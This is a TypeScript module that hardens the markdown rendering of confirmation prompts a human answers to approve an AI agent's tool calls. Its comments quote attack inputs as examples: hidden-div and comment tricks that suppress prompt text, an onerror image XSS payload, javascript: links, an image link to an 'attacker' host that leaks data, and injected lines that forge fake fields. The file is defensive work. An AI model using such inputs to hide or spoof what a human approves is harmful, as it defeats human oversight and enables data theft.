import { Marked } from 'marked';
import DOMPurify from 'dompurify';

/**
 * Markdown rendering for CONFIRMATION-PROMPT text — the prompts a human answers
 * to authorise a tool call (`http_request` outbound consent, `api_setup`
 * endpoint ack, `knowledge_delete`, `subjects_merge`, `mail_send`/`mail_reply`,
 * `ask_user`).
 *
 * These prompts interpolate values the agent — or, for `mail_reply`, an
 * arbitrary external sender — controls. Rendering them through the normal chat
 * markdown path let such a value SUPPRESS the rest of the prompt: an unclosed
 * `<div hidden>` re-parents every following line into an invisible container,
 * and a `<!--` swallows them into a comment. Either way the text a human clicks
 * "Yes" to was no longer the text on screen.
 *
 * Two layers, in this order and for this reason:
 *
 * 1. Renderer overrides on `html`, `text`, `link` and `image` so the markdown
 *    stage does not EMIT raw HTML in the first place. This is the layer the
 *    tests exercise, so it is the one that has to hold on its own.
 * 2. `DOMPurify.sanitize` behind it. It cannot be exercised by the suite —
 *    it needs a real DOM and FAILS OPEN without one, returning its input
 *    unchanged and silently — so it is not something to rest a security
 *    property on. It stays anyway, because "cannot be relied upon" is not
 *    "worthless": it is what catches a marked upgrade that starts emitting
 *    something these overrides don't anticipate.
 *
 * The `text` override in layer 1 is not decoration. marked marks text tokens
 * `escaped: true` while its lexer is `inRawBlock`, which a leading `<code>`,
 * `<kbd>`, `<pre>` or `<script>` in an interpolated value is enough to set —
 * and the default `text` renderer returns escaped tokens VERBATIM. Without the
 * override, `<code><img/src=x onerror=…>` in a mail subject reached the DOM as
 * a live element.
 *
 * Scope, stated honestly: this closes SUPPRESSION. It does not stop a value
 * from adding a plausible-looking FAKE line of its own — that needs the prompt
 * payload to separate system frame from interpolated value, which is a
 * different change (see DEF-confirm-prompt-value-spoofing).
 */

/** Schemes a link inside a prompt may point at. */
const SAFE_LINK_SCHEMES: ReadonlySet<string> = new Set(['http:', 'https:', 'mailto:']);

const ESCAPE_CHARS: Readonly<Record<string, string>> = {
	'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
};

/**
 * Mirrors marked's own `escapeReplaceNoEncode`: angle brackets and quotes always,
 * but `&` only when it does NOT already begin an entity.
 *
 * Escaping every `&` unconditionally is wrong and user-visible — `Tom &amp; Jerry`
 * in a subject came out as a literal `&amp;` on screen, and `a&nbsp;b` lost its
 * non-breaking space. Leaving existing entities alone is safe: the HTML parser
 * resolves `&lt;` to a character AFTER tokenising, so an entity can never become
 * a tag.
 */
function escapeHtml(value: string): string {
	return value.replace(
		/[<>"']|&(?!(?:#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g,
		(char) => ESCAPE_CHARS[char] ?? char,
	);
}

/**
 * A link target is safe only as an ABSOLUTE url on an allowlisted scheme.
 * `javascript:`, `data:` and `vbscript:` all survive marked untouched (verified
 * against marked 18), and scheme matching has to be case-insensitive —
 * `JaVaScRiPt:` parses just fine. Relative hrefs are refused rather than
 * resolved: a prompt has no meaningful relative target, so anything relative is
 * more likely an attempt to look like a link than a real one.
 */
export function isSafePromptHref(href: string): boolean {
	try {
		// The URL parser lowercases the scheme, so this comparison is
		// case-insensitive without a manual toLowerCase().
		return SAFE_LINK_SCHEMES.has(new URL(href).protocol);
	} catch {
		return false;
	}
}

/**
 * A marked instance private to prompt rendering.
 *
 * It must be its OWN instance: `marked.use()` mutates the shared singleton, so
 * configuring the global would silently re-configure every chat message too.
 *
 * `breaks: true` gives each field its own line: the prompts separate fields with
 * single newlines (`**To:** …\n**Subject:** …`), which marked's default collapses
 * into one run-on paragraph. A reader who cannot tell the fields apart checks
 * nothing, so this matters for a prompt that carries a security decision.
 *
 * Its effect on FORGERY is not uniform, and the difference is worth knowing
 * before reusing this reasoning:
 *   - Where the caller forces values through `singleLine()` (the mail previews),
 *     a value cannot contain a newline, so it cannot open a line of its own —
 *     strictly better than the collapsed paragraph.
 *   - Where it does not (`http_request` host/path, `api_setup`, `ask_user`), a
 *     value carrying `\n**Host:** …` now renders that on its own row, which
 *     looks exactly like a real field. Under the collapsed paragraph the same
 *     payload landed mid-sentence, where a second `Host:` reads as odd. So this
 *     makes an already-possible forgery more plausible; it does not create it.
 * Closing that asymmetry needs the payload to mark which spans are values —
 * see DEF-confirm-prompt-value-spoofing. It is deliberately NOT patched by
 * escaping newlines here: this layer receives one finished string and cannot
 * tell a frame newline from a value newline.
 */
const promptMarked = new Marked({
	gfm: true,
	breaks: true,
	tokenizer: {
		/**
		 * A link-reference definition produces no output at all, so a multi-line
		 * one (`[a]: https://e "` … `"`) SWALLOWS every line caught inside its
		 * title — measured: body quote and size warning both gone. Returning
		 * undefined declines the token so the text falls through to a paragraph
		 * and stays on screen. Reference-style links are of no use in a prompt.
		 */
		def() {
			return undefined;
		},
	},
	renderer: {
		/**
		 * `<div hidden>` and `<!--` become characters on screen instead of
		 * structure. Block and inline HTML both arrive here.
		 */
		html(token) {
			return escapeHtml(token.text);
		},

		/**
		 * marked flags text tokens `escaped: true` while its lexer is
		 * `inRawBlock` — a leading `<code>`/`<kbd>`/`<pre>`/`<script>` in an
		 * interpolated value sets it — and the DEFAULT text renderer returns
		 * those verbatim. That reopened everything the `html` override closes,
		 * up to and including a live `<img/src=x onerror=…>`. Container tokens
		 * still recurse so inline emphasis inside a paragraph keeps working.
		 */
		text(token) {
			return 'tokens' in token && token.tokens && token.tokens.length > 0
				? this.parser.parseInline(token.tokens)
				: escapeHtml(token.text);
		},

		/**
		 * Unsafe targets degrade to their visible text rather than vanishing.
		 * Dropping the text instead would hand an attacker the very thing this
		 * module exists to prevent — a way to make prompt content disappear.
		 */
		link(token) {
			const text = this.parser.parseInline(token.tokens);
			if (!isSafePromptHref(token.href)) return text;
			const title = token.title ? ` title="${escapeHtml(token.title)}"` : '';
			return `<a href="${escapeHtml(token.href)}"${title} rel="noreferrer noopener" target="_blank">${text}</a>`;
		},

		/**
		 * No `<img>` in a prompt, ever. marked emits a real `<img src=…>`, so
		 * `![](https://attacker/?d=…)` in an attacker-controlled subject would
		 * fire an outbound request the moment the confirmation is DISPLAYED —
		 * a tracking/exfil channel that needs no click at all. The alt text is
		 * kept so nothing silently disappears.
		 */
		image(token) {
			const alt = token.text.trim();
			return escapeHtml(alt.length > 0 ? `[image: ${alt}]` : '[image]');
		},
	},
});

/**
 * What layer 2 permits. Pinned to this list rather than DOMPurify's defaults,
 * which allow `div`, `style` and `hidden` and keep comments — exactly the
 * suppression primitives.
 *
 * This is a CEILING, not an inventory of what marked emits: `input` is emitted
 * for task lists and deliberately absent (see `PROMPT_STRIPPED_TAGS`). The tests
 * assert both directions, so a marked upgrade that emits some third thing shows
 * up as a failure instead of being silently deleted in the browser.
 */
export const PROMPT_EMITTED_TAGS: readonly string[] = [
	'p', 'br', 'strong', 'em', 'del', 'code', 'pre', 'blockquote',
	'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'a', 'hr',
	'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

/**
 * Tags marked emits that layer 2 removes on purpose. Listed explicitly because
 * the difference between "deliberately stripped" and "overlooked" is invisible
 * once it only happens in a browser.
 *
 * `input` comes from GFM task lists (`- [ ] x`). A prompt has no business
 * carrying an input element, and the tag is void — removing it costs the
 * checkbox and nothing else, the item's text is untouched.
 */
export const PROMPT_STRIPPED_TAGS: readonly string[] = ['input'];

/**
 * Attributes layer 2 keeps. `start` is here for a content reason, not a cosmetic
 * one: marked renders `3. third` as `<ol start="3">`, and dropping the attribute
 * silently renumbers the list to 1, 2 — the prompt would then display different
 * values than the text it was built from. `class` (code fences) and `align`
 * (table cells) are dropped; both are purely presentational here, since this
 * path has no syntax highlighter.
 */
export const PROMPT_ALLOWED_ATTR: readonly string[] = ['href', 'title', 'rel', 'target', 'start'];

/**
 * Shown when a prompt arrives without text. Not localised on purpose: it marks a
 * broken payload, never normal operation, and an untranslated warning beats the
 * alternative below.
 */
const MISSING_PROMPT_TEXT = '⚠ <strong>Prompt text unavailable.</strong> Deny unless you know what this is.';

/**
 * Render confirmation-prompt markdown to HTML for injection.
 *
 * Layer 1 (marked overrides above) is what the suite verifies and what has to
 * hold. Layer 2 (DOMPurify) runs only where a DOM exists; without one it returns
 * its input unchanged, which is why nothing here depends on it.
 */
export function renderPromptMarkdown(text: string): string {
	// Returning nothing would leave the approver with bare Yes/No buttons and no
	// text at all — the same blank prompt this module exists to prevent, just
	// arriving through a broken payload instead of an attack. Say so instead.
	if (typeof text !== 'string' || text.length === 0) return `<p>${MISSING_PROMPT_TEXT}</p>`;
	return sanitizePromptHtml(promptMarked.parse(text, { async: false }) as string);
}

/**
 * Layer 2. Outside a browser — the test runner, SSR — DOMPurify's default export
 * is an uninitialised factory with no `sanitize` at all, so this hands the
 * markdown stage's output straight back. That absence is not worked around on
 * purpose: pretending layer 2 is present where it cannot run is how a fail-open
 * guard gets mistaken for a real one.
 *
 * Its own failure mode is worth naming rather than assuming it is free upside:
 * anything outside the lists above is DELETED, in the browser only, where no CI
 * run can see it. On an unanticipated tag that is content loss — the very thing
 * layer 1 is built to prevent. Hence the tests pin both what may appear and what
 * is knowingly stripped, so the set never drifts unobserved.
 */
function sanitizePromptHtml(html: string): string {
	if (typeof DOMPurify.sanitize !== 'function') return html;
	return DOMPurify.sanitize(html, {
		ALLOWED_TAGS: [...PROMPT_EMITTED_TAGS],
		ALLOWED_ATTR: [...PROMPT_ALLOWED_ATTR],
		ALLOW_DATA_ATTR: false,
	});
}
